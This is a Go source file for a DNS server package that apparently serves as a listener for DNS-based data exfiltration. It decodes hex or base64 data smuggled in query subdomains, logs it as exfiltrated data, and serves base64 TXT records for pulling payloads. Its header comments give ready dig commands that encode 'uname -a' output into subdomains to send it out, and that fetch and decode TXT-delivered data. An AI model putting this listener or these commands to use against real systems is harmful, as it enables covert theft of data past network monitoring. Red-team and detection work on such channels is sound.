package godns

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"log"
	"strings"
	"unicode"

	"github.com/miekg/dns"
)

// tricks:
//		detects hex or base64 encoded data and logs the decoded data
//		base64 or hex can be anywhere in subs www.$(base64).test.com
//		split prefix can be used to split strings > 63 chars  split.$(string_part1).$(string_part2).test.com
//		TXT records can be used for pulling data,will be base64 encoded,  data > 255 chars will come back as multiple responses so you have to re-assemble.

// linux: split
// 		dig @127.0.0.1 -p 5354 split.$(uname -a|base64 -w0|sed 's/.\{63\}/&./g').test.com
// linux combine TXT
// 		dig +short @127.0.0.1 -p 5354 cradle.test.com TXT|sed 's/ //g;s/"//g'|base64 -d

type DNSConfig struct {
	Addr          string
	Port          string
	DefaultAnswer string
	CustomAnswers map[string]string
	TXTRecords    map[string]string
	Domain        string
	Cmds          map[string]func(string)
	JSONDoLog     bool
	JSONLogFile   string
	Running       bool
	server        *dns.Server
}

func New() *DNSConfig {
	ret := &DNSConfig{}
	ret.Cmds = make(map[string]func(string))
	ret.Cmds["file"] = cmdFile
	ret.TXTRecords = make(map[string]string)
	ret.CustomAnswers = make(map[string]string)
	return ret
}

func (dc *DNSConfig) ShutDown() {
	log.Println("Shutting down the DNS server...")
	dc.server.Shutdown()
	dc.Running = false
}

func (dc *DNSConfig) Run() {
	dc.Running = true
	dns.HandleFunc(".", dc.handler)
	dc.server = &dns.Server{Addr: dc.Addr + ":" + dc.Port, Net: "udp"}
	log.Printf("Starting DNS at %s\n", dc.server.Addr)
	err := dc.server.ListenAndServe()
	defer dc.server.Shutdown()
	if err != nil {
		log.Printf("Failed to start DNS server: %s\n ", err.Error())
	}
	dc.Running = false
}

func (dc *DNSConfig) handler(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = false

	switch r.Opcode {
	case dns.OpcodeQuery:
		dc.parseQuery(m, w, r)
	}
	w.WriteMsg(m)
}

func (dc *DNSConfig) parseQuery(m *dns.Msg, w dns.ResponseWriter, r *dns.Msg) {
	for _, question := range m.Question {
		switch question.Qtype {
		case dns.TypeA:
			dc.handleA(question, m, w, r)

		case dns.TypeTXT:
			dc.handleTXT(question, m, w, r)
		}
	}
}

func (dc *DNSConfig) handleA(question dns.Question, m *dns.Msg, w dns.ResponseWriter, r *dns.Msg) {
	// TODO: add blacklisting
	// set default generic response
	answer := dc.DefaultAnswer
	// handle custom specified with full domain
	if dc.CustomAnswers[question.Name] != "" {
		answer = dc.CustomAnswers[question.Name]
	}
	// handle custom specified as just a sub
	sub := dc.stripDomain(question.Name)
	if dc.CustomAnswers[sub] != "" {
		answer = dc.CustomAnswers[sub]
	}

	ex := dc.parseForExfil(question.Name)

	// return response
	rrStr := fmt.Sprintf("%s A %s", question.Name, answer)
	rr, err := dns.NewRR(rrStr)
	if err == nil {
		m.Answer = append(m.Answer, rr)
	}
	dc.LogQuery(question, m, w, r, answer)

	if len(ex) > 0 {
		log.Printf("A request for %s from %s\n     ├─ Response: %s\n", question.Name, w.RemoteAddr().String(), answer)
		fmt.Printf("     └─ Exfil data detected: %s\n", strings.Join(ex, ","))
	} else {
		log.Printf("A request for %s from %s\n     └─ Response: %s\n", question.Name, w.RemoteAddr().String(), answer)
	}
}

func (dc *DNSConfig) handleTXT(question dns.Question, m *dns.Msg, w dns.ResponseWriter, r *dns.Msg) {
	sub := getFirstSub(question.Name)
	var txt string
	if txt = dc.TXTRecords[sub]; txt == "" {
		txt = "NOT FOUND"
	}
	rrStr := fmt.Sprintf("%s TXT %s", question.Name, base64.StdEncoding.EncodeToString([]byte(txt)))
	rr, err := dns.NewRR(rrStr)
	if err == nil {
		m.Answer = append(m.Answer, rr)
	}
	dc.LogQuery(question, m, w, r, sub)
	log.Printf("TXT request for %s from %s:\n     └─ Sent: \"%s\" TXT record\n", question.Name, w.RemoteAddr().String(), sub)
}

func (dc *DNSConfig) stripDomain(d string) string {
	return strings.TrimRight(strings.ReplaceAll(d, dc.Domain, ""), ".")
}

func getFirstSub(s string) string {
	return strings.Split(s, ".")[0]
}

func cmdFile(a string) {
	// TODO: handle file.filename.test.com
}

func (dc *DNSConfig) parseForExfil(q string) []string {
	var ret []string
	if getFirstSub(q) == "split" {
		clean := strings.ReplaceAll(strings.ReplaceAll(dc.stripDomain(q), "split.", ""), ".", "")
		ret = append(ret, strings.TrimRight(decodeHexOrBase64(clean), "\n"))
		return ret
	}
	data := ""
	tmp := strings.Split(q, ".")
	for _, p := range tmp {
		data = decodeHexOrBase64(p)
		if p != data && data != "" {
			ret = append(ret, strings.TrimRight(data, "\n"))
		}
	}
	return ret
}
func checkEncoding(q string) (bool, string) {
	return false, ""
}

func decodeHexOrBase64(content string) string {
	result := content
	dat := []byte(content)
	isHex := true
	for _, v := range dat {
		if v >= 48 && v <= 57 || v >= 65 && v <= 70 || v >= 97 && v <= 102 {
			// isHex = true
		} else {
			isHex = false
			break
		}
	}
	if isHex {
		if strings.HasPrefix(content, "0x") {
			strings.Replace(content, "0x", "", 1)
		}

		d, err := hex.DecodeString(content)
		if err == nil {
			result = string(d)
		}

	} else {
		r, _ := base64.StdEncoding.DecodeString(content)
		result = string(r)
	}

	if isASCII(result) {
		return result
	}
	return content

}

func isASCII(s string) bool {
	for i := 0; i < len(s); i++ {
		if s[i] > unicode.MaxASCII {
			return false
		}
	}
	return true
}
